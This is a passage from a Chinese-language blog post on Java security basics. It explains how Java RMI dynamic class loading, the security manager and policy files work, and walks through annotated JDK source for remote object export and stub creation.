registry.lookup(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">        System.out.println(hello.sayHello(<span class="string">&quot;sky123&quot;</span>));</span><br><span class="line">        System.out.println(hello.sayGoodBye());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>在 Java RMI 中，当客户端调用远程方法时，参数对象（尤其是 <strong>序列化对象</strong>）会被传输到服务器端。为了成功传输和处理这些对象，服务器端需要能够反序列化客户端传递的对象。如果服务器端的类路径中没有相应的类，反序列化就会失败，抛出 <code>ClassNotFoundException</code>。</p>
<p>为了解决这个问题，RMI 提供了一种 <strong>动态类加载</strong> 机制。当客户端传递的对象在服务器端找不到时，服务器会根据配置自动从指定的位置加载相应的类字节码。这通常是通过设置 <code>java.rmi.server.codebase</code> 属性来实现的。</p>
<p><code>java.rmi.server.codebase</code> 属性可以在 Java 代码中通过 <code>System.setProperty(&quot;java.rmi.server.codebase&quot;, &quot;http://127.0.0.1:8000/&quot;);</code> 设置，也可以通过 Java 启动参数 <code>-Djava.rmi.server.codebase=&quot;http://127.0.0.1:8000/&quot;</code> 设置。</p>
<p>另外Java 在执行涉及网络通信或动态类加载的操作时，出于安全考虑，会进行一系列权限控制。这些控制由 <strong>Java 安全管理器</strong> (<code>SecurityManager</code>) 和 <strong>安全策略文件</strong>（<code>java.security.policy</code>）决定。</p>
<ul>
<li><p>首先是 Java 安全管理器，因为我们通过网络加载外部类并执行方法，所以我们必须要有一个安全管理器来进行管理，如果没有设置安全管理，则 RMI 不会动态加载任何类。通常我们使用如下代码设置安全管理器：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 如果没有安全管理器，则创建并设置一个新的安全管理器实例。</span></span><br><span class="line"><span class="keyword">if</span> (System.getSecurityManager() == <span class="literal">null</span>) &#123;</span><br><span class="line">    System.setSecurityManager(<span class="keyword">new</span> <span class="title class_">RMISecurityManager</span>());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>另外我们还需要设置 <strong><code>java.security.policy</code></strong> 为指定的安全策略文件文件来确保 <strong>动态类加载</strong> 能够正常工作并且不引发安全异常。在安全策略文件（这里我们指定为 <code>rmi.policy</code>）中需要授予执行 RMI 相关操作的权限。</p>
  <div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">grant &#123;</span><br><span class="line">    permission java.security.AllPermission;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p>  <code>java.security.policy</code> 可以使用 <code>System.setProperty(&quot;java.security.policy&quot;, RMIServer.class.getClassLoader().getResource(&quot;rmi.policy&quot;).toString());</code> 或者 <code>-Djava.security.policy=rmi.policy</code> 来指定。</p>
</li>
</ul>
<p>我们在客户端 RMI 远程调用时传入了一个服务端不存在的类对象 <code>Calc</code>。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hello.sayHello(<span class="keyword">new</span> <span class="title class_">Calc</span>());</span><br></pre></td></tr></table></figure></div>

<p>服务端在反序列时 <code>Calc</code> 对象时发现 <code>Calc</code> 类不存在，于是会从 <code>java.rmi.server.codebase</code> 指定的 URL 中寻找 <code>Calc.class</code> 并加载。加载完 <code>Calc.class</code> 便会对传入的 <code>Calc</code> 对象参数进行反序列化。</p>
<h3 id="RMI-工作流程"><a href="#RMI-工作流程" class="headerlink" title="RMI 工作流程"></a>RMI 工作流程</h3><p>RMI 的工作流程大致如下图所示：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/11/Java%20%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/images/RMI.png"
                      alt="img"
                ></p>
<h3 id="服务注册"><a href="#服务注册" class="headerlink" title="服务注册"></a>服务注册</h3><h4 id="远程对象创建"><a href="#远程对象创建" class="headerlink" title="远程对象创建"></a>远程对象创建</h4><p>通常我们定义的远程对象会继承于 <code>java.rmi.server.UnicastRemoteObject</code>：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RemoteHello</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">Hello</span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">RemoteHello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>因此创建远程对象的时候会调用父类 <code>UnicastRemoteObject</code> 的构造函数。关于 <code>UnicastRemoteObject</code> 的构造函数的调用有如下调用链：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 使用指定的服务器引用导出指定的远程对象。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> Remote <span class="title function_">exportObject</span><span class="params">(Remote obj, UnicastServerRef sref)</span></span><br><span class="line">        <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">    <span class="comment">// 如果远程对象是 UnicastRemoteObject 的实例，则设置其引用</span></span><br><span class="line">    <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> UnicastRemoteObject) &#123;</span><br><span class="line">        ((UnicastRemoteObject) obj).ref = sref;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用 UnicastServerRef 的 exportObject 方法，完成远程对象的导出</span></span><br><span class="line">    <span class="keyword">return</span> sref.exportObject(obj, <span class="literal">null</span>, <span class="literal">false</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 导出远程对象，使其能够接收来自客户端的调用，并使用指定的端口。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;该对象通过使用 &#123;<span class="doctag">@link</span> RMISocketFactory&#125; 类创建的服务器套接字进行导出。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> obj 需要导出的远程对象</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> port 用于导出远程对象的端口号</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 远程对象的存根（Stub）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@exception</span> RemoteException 如果导出失败，则抛出该异常</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 1.2</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Remote <span class="title function_">exportObject</span><span class="params">(Remote obj, <span class="type">int</span> port)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">    <span class="comment">// 调用带 UnicastServerRef 参数的 exportObject 方法进行远程对象导出</span></span><br><span class="line">    <span class="keyword">return</span> exportObject(obj, <span class="keyword">new</span> <span class="title class_">UnicastServerRef</span>(port));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 使用指定的端口号创建并导出一个新的 UnicastRemoteObject 对象。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;该对象通过使用 &#123;<span class="doctag">@link</span> RMISocketFactory&#125; 类创建的服务器套接字进行导出。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> port 远程对象接收调用的端口号</span></span><br><span class="line"><span class="comment"> *              （如果 &lt;code&gt;port&lt;/code&gt; 为零，则选择一个匿名端口）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> RemoteException 如果导出对象失败，抛出该异常</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 1.2</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> <span class="title function_">UnicastRemoteObject</span><span class="params">(<span class="type">int</span> port)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">    <span class="built_in">this</span>.port = port;  <span class="comment">// 设置端口号</span></span><br><span class="line">    exportObject((Remote) <span class="built_in">this</span>, port);  <span class="comment">// 调用导出方法，将远程对象导出到指定端口</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 使用匿名端口创建并导出一个新的 UnicastRemoteObject 对象。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;该对象通过使用 &#123;<span class="doctag">@link</span> RMISocketFactory&#125; 类创建的服务器套接字进行导出。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> RemoteException 如果导出对象失败，抛出该异常</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> JDK1.1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> <span class="title function_">UnicastRemoteObject</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">    <span class="built_in">this</span>(<span class="number">0</span>);  <span class="comment">// 调用带端口号的构造方法，0 表示使用匿名端口</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>UnicastRemoteObject</code> 构造函数的调用过程为：</p>
<ol>
<li><strong><code>UnicastRemoteObject()</code></strong> ：使用匿名端口（端口为 0，系统会自动选择一个可用端口）创建并导出一个 <code>UnicastRemoteObject</code> 对象。</li>
<li><strong><code>UnicastRemoteObject(int port)</code></strong> ：使用 <code>UnicastRemoteObject</code> 对象本身和指定的端口号创建并导出一个 <code>UnicastRemoteObject</code> 对象。</li>
<li><strong><code>exportObject(Remote obj, int port)</code></strong> ：根据传入的端口号创建一个 <code>UnicastServerRef</code> 对象（存在多层封装，与网络连接有关）用于将远程对象导出到指定的服务器引用。</li>
<li><strong><code>exportObject(Remote obj, UnicastServerRef sref)</code></strong> ：检查传入的 <code>obj</code> 是否是 <code>UnicastRemoteObject</code> 的实例。如果是，设置<code>UnicastRemoteObject</code> 对象的 <code>ref</code> 属性为指定的 <code>UnicastServerRef</code>。<code>UnicastServerRef</code> 是远程对象导出时所需的服务器引用，负责处理网络请求和数据传输。</li>
</ol>
<p><code>UnicastRemoteObject</code> 构造函数最终会调用到 <code>UnicastServerRef</code> 的 <code>exportObject(Remote impl, Object data, boolean permanent)</code> 方法创建服务器存根（<code>Stub</code>），该函数逻辑如下：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 导出该对象，为该调度器创建骨架和存根。</span></span><br><span class="line"><span class="comment"> * 根据实现类的类型创建存根，并用适当的远程引用初始化它。</span></span><br><span class="line"><span class="comment"> * 创建由实现类、调度器（当前对象）和存根定义的目标对象。</span></span><br><span class="line"><span class="comment"> * 通过 Ref 导出该目标对象。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> Remote <span class="title function_">exportObject</span><span class="params">(Remote impl, Object data,</span></span><br><span class="line"><span class="params">                            <span class="type">boolean</span> permanent)</span></span><br><span class="line">        <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">    Class&lt;?&gt; implClass = impl.getClass();  <span class="comment">// 获取远程对象实现类</span></span><br><span class="line">    Remote stub;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 创建存根（Stub），使用远程对象的实现类和客户端引用</span></span><br><span class="line">        stub = Util.createProxy(implClass, getClientRef(), forceStubUse);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalArgumentException e) &#123;</span><br><span class="line">        <span class="comment">// 如果实现类没有合法的远程接口，抛出异常</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ExportException</span>(</span><br><span class="line">            <span class="string">&quot;remote object implements illegal remote interface&quot;</span>, e);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果存根是 RemoteStub 的实例，设置骨架（Skeleton）</span></span><br><span class="line">    <span class="keyword">if</span> (stub <span class="keyword">instanceof</span> RemoteStub) &#123;</span><br><span class="line">        setSkeleton(impl);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建目标对象，目标包含实现类、当前对象（调度器）、存根和引用等信息</span></span><br><span class="line">    <span class="type">Target</span> <span class="variable">target</span> <span class="operator">=</span> </span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Target</span>(impl, <span class="built_in">this</span>, stub, ref.getObjID(), permanent);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 通过引用（ref）导出目标对象</span></span><br><span class="line">    ref.exportObject(target);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取实现类对应的方法映射</span></span><br><span class="line">    hashToMethod_Map = hashToMethod_Maps.get(implClass);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 返回存根</span></span><br><span class="line">    <span class="keyword">return</span> stub;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>服务器存根是通过 <code>sun.rmi.server.Util#createProxy()</code> 创建的代理类，创建时需要以下几个参数：</p>
<ul>
<li><p><code>implClass</code>：远程对象的实现类，这里也就是 <code>RemoteHello.class</code>。</p>
</li>
<li><p><code>getClientRef()</code>：实际上就是将 <code>UnicastServerRef</code> 的 <code>LiveRef</code> 属性封装成一个<code>UnicastRef</code>。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 注意：此类的 getLiveRef 方法（由于它被 UnicastRef2 继承）</span></span><br><span class="line"><span class="comment"> * 对于 javax.management.remote.rmi.RMIConnector 的实现有一个 JDK 内部的依赖。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UnicastRef</span> <span class="keyword">implements</span> <span class="title class_">RemoteRef</span> &#123;</span><br><span class="line">    <span class="keyword">protected</span> LiveRef ref;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 创建一个新的 Unicast RemoteRef。</span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> liveRef 远程对象的 LiveRef 引用</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">UnicastRef</span><span class="params">(LiveRef liveRef)</span> &#123;</span><br><span class="line">        ref = liveRef;  <span class="comment">// 设置 LiveRef，表示远程对象的具体信息</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UnicastServerRef</span> <span class="keyword">extends</span> <span class="title class_">UnicastRef</span></span><br><span class="line">    <span class="keyword">implements</span> <span class="title class_">ServerRef</span>, Dispatcher &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 返回此远程引用的客户端引用。</span></span><br><span class="line"><span class="comment">     * 对于客户端的 RemoteRef，返回 &quot;this&quot; 本身。</span></span><br><span class="line"><span class="comment">     * 对于服务端的远程引用，将需要找到或创建一个客户端的引用。</span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 客户端可用的远程引用实例</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> RemoteRef <span class="title function_">getClientRef</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">UnicastRef</span>(ref);  <span class="comment">// 基于服务端引用 ref 创建客户端引用</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
</li>
<li><p><code>forceStubUse</code>：<code>UnicastServerRef</code> 未显式初始化该成员，因此默认为 <code>false</code>。</p>
</li>
</ul>
<p><code>sun.rmi.server.Util#createProxy()</code> 函数为远程对象 <code>RemoteHello</code> 创建动态代理。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 为指定的实现类（implClass）返回一个代理对象。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 如果满足以下两个条件，则返回实现类的动态代理（否则返回指定实现类的 RemoteStub 实例）：</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *    a) 要么属性 java.rmi.server.ignoreStubClasses 为 true，要么指定实现类没有预生成的存根类，</span></span><br><span class="line"><span class="comment"> *       并且</span></span><br><span class="line"><span class="comment"> *    b) forceStubUse 为 false。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 如果满足上述条件，则此方法构造一个动态代理实例（该代理实现了 implClass 的远程接口），</span></span><br><span class="line"><span class="comment"> * 该代理通过 RemoteObjectInvocationHandler 实例构造，后者使用 clientRef。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 否则，此方法加载预生成的存根类（该存根类继承 RemoteStub 并实现 implClass 的远程接口），</span></span><br><span class="line"><span class="comment"> * 并使用 clientRef 构造该预生成存根类的实例。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> implClass 要获取远程接口的类</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> clientRef 用于调用处理器的远程引用</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> forceStubUse 如果为 true，强制创建 RemoteStub</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IllegalArgumentException 如果 implClass 实现了非法的远程接口</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> StubNotFoundException 如果在查找/创建存根或创建动态代理实例时发生问题</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Remote <span class="title function_">createProxy</span><span class="params">(Class&lt;?&gt; implClass,</span></span><br><span class="line"><span class="params">                                 RemoteRef clientRef,</span></span><br><span class="line"><span class="params">                                 <span class="type">boolean</span> forceStubUse)</span></span><br><span class="line">        <span class="keyword">throws</span> StubNotFoundException &#123;</span><br><span class="line">    Class&lt;?&gt; remoteClass;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 获取远程接口的类</span></span><br><span class="line">        remoteClass = getRemoteClass(implClass);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException ex ) &#123;</span><br><span class="line">        <span class="comment">// 如果找不到远程接口，抛出 StubNotFoundException 异常</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">StubNotFoundException</span>(</span><br><span class="line">            <span class="string">&quot;object does not implement a remote interface: &quot;</span> +</span><br><span class="line">            implClass.getName());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果 forceStubUse 为 true，或者未满足忽略存根类条件（即存在存根类），则创建 RemoteStub</span></span><br><span class="line">    <span class="keyword">if</span> (forceStubUse || !(ignoreStubClasses || !stubClassExists(remoteClass))) &#123;</span><br><span class="line">        <span class="keyword">return</span> createStub(remoteClass, clientRef);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取类加载器和实现类的远程接口</span></span><br><span class="line">    <span class="keyword">final</span> <span class="type">ClassLoader</span> <span class="variable">loader</span> <span class="operator">=</span> implClass.getClassLoader();</span><br><span class="line">    <span class="keyword">final</span> Class&lt;?&gt;[] interfaces = getRemoteInterfaces(implClass);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 创建用于远程调用的 InvocationHandler</span></span><br><span class="line">    <span class="keyword">final</span> <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">RemoteObjectInvocationHandler</span>(clientRef);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 通过 PrivilegedAction 创建动态代理</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> AccessController.doPrivileged(<span class="keyword">new</span> <span class="title class_">PrivilegedAction</span>&lt;Remote&gt;() &#123;</span><br><span class="line">            <span class="keyword">public</span> Remote <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> (Remote) Proxy.newProxyInstance(loader,</span><br><span class="line">                                                       interfaces,</span><br><span class="line">                                                       handler);</span><br><span class="line">            &#125;&#125;);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalArgumentException e) &#123;</span><br><span class="line">        <span class="comment">// 如果创建代理失败，抛出 StubNotFoundException 异常</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">StubNotFoundException</span>(<span class="string">&quot;unable to create proxy&quot;</span>, e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h4 id="注册中心创建"><a href="#注册中心创建" class="headerlink" title="注册中心创建"></a>注册中心创建</h4><h4 id="服务注册-1"><a href="#服务注册-1" class="headerlink" title="服务注册"></a>服务注册</h4><h3 id="服务发现"><a href="#服务发现" class="headerlink" title="服务发现"></a>服务发现</h3><h3 id="服务调用"><a href="#服务调用" class="headerlink" title="服务调用"></a>服务调用</h3><pre class="mermaid">sequenceDiagram
    participant Client
    participant Client_Stub
    participant Server_Stub
    participant Server
    
    
    Client->>Client_Stub: 1. 客户端调用
    activate Client
    activate Client_Stub
    Client_Stub->>Client_Stub: 2. 序列化
    Client_Stub->>Server_Stub: 3. 发送消息
    activate Server_Stub
    Server_Stub->>Server_Stub: 4. 反序列化
    Server_Stub->>Server: 5. 调用本地服务
    activate Server
    Server->>Server: 6. 服务处理
    Server-->>Server_Stub: 7. 返回处理结果
    deactivate Server
    Server_Stub->>Server_Stub: 8. 将结果序列化
    Server_Stub-->>Client_Stub: 9. 返回消息
    deactivate Server_Stub
    Client_Stub->>Client_Stub: 10. 反序列化
    Client_Stub-->>Client: 11. 返回调用结果
    deactivate Client_Stub
    deactivate Client</pre>


		</div>

		
		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
			<div class="article-copyright-info-container">
    <ul>
        <li><strong>Title:</strong> Java 安全基础</li>
        <li><strong>Author:</strong> sky123</li>
        <li><strong>Created at
                :</strong> 2024-11-11 23:50:14</li>
        
            <li>
                <strong>Updated at
                    :</strong> 2025-04-05 03:38:29
            </li>
        
        <li>
            <strong>Link:</strong> https://skyi23.github.io/2024/11/11/Java 安全基础/
        </li>
        <li>
            <strong>
                License:
            </strong>
            

            
                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
            
        </li>
    </ul>
</div>

		</div>
		

		
		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
			
			<li class="tag-item mx-0.5">
				<a href="/tags/java-web/">#java web</a>&nbsp;
			</li>
			
		</ul>
		

		

		
		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
			
			<div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
				<a class="prev" rel="prev" href="/2024/11/11/Java%20Web%20%E5%BC%80%E5%8F%91%E5%9F%BA%E7%A1%80/">
					<span class="left arrow-icon flex justify-center items-center">
						<i class="fa-solid fa-chevron-left"></i>
					</span>
					<span class="title flex justify-center items-center">
						<span class="post-nav-title-item">Java Web 开发基础</span>
						<span class="post-nav-item">Prev posts</span>
					</span>
				</a>
			</div>
			
			
			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
				<a class="next" rel="next" href="/2024/11/11/SQL%20%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/">
					<span class="title flex justify-center items-center">
